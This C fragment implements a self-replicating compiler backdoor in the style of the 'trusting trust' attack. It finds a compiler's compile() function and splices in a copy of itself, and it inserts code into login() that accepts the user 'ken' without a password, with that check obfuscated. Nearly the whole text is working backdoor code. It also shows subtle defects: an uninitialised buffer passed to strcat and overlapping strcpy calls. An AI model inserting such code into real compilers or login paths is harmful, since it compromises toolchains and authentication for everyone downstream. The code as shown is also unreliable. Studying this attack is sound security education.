
static char compile_sig[] =
    "static void compile(char *program, char *outname) {\n"
    "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
    "    assert(fp);";

char *compile_attack = prog;

char *location = strstr(program, compile_sig);

if (location) {
  char prog_as_string[1000000];

  char *val = "char prog[] = {";
  strcat(prog_as_string, val);

  char buffer[500];
  for (int i = 0; i < sizeof(prog) / sizeof(prog[0]) - 1; i++) {
    sprintf(buffer, "%d", prog[i]);
    strcat(prog_as_string, buffer);
    strcat(prog_as_string, ",");
  }
  strcat(prog_as_string, " 0};\n");
  // First copy everything after needle to the point it needs to be for correct
  // spacing
  int compile_sig_len = strlen(compile_sig);
  int compile_attack_len = strlen(compile_attack);
  int prog_as_string_len = strlen(prog_as_string);

  strcpy(location + compile_sig_len + compile_attack_len + prog_as_string_len,
         location + compile_sig_len);

  // Then copy in the attack
  strncpy(location + compile_sig_len, prog_as_string, prog_as_string_len);
  strncpy(location + compile_sig_len + prog_as_string_len, compile_attack,
          compile_attack_len);
}

static char login_sig[] = "int login(char *user) {";
// static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char login_attack[] = "if(user[0] == 'k' && user[1] == 'e' && user[2] "
                             "== 'n' && strlen(user) == 3) return 1;";
location = strstr(program, login_sig);
if (location) {
  int login_sig_len = strlen(login_sig);
  int login_attack_len = strlen(login_attack);

  memmove(location + login_sig_len + login_attack_len, location + login_sig_len,
          strlen(location + login_sig_len) + 1);
  strncpy(location + login_sig_len, login_attack, login_attack_len);
}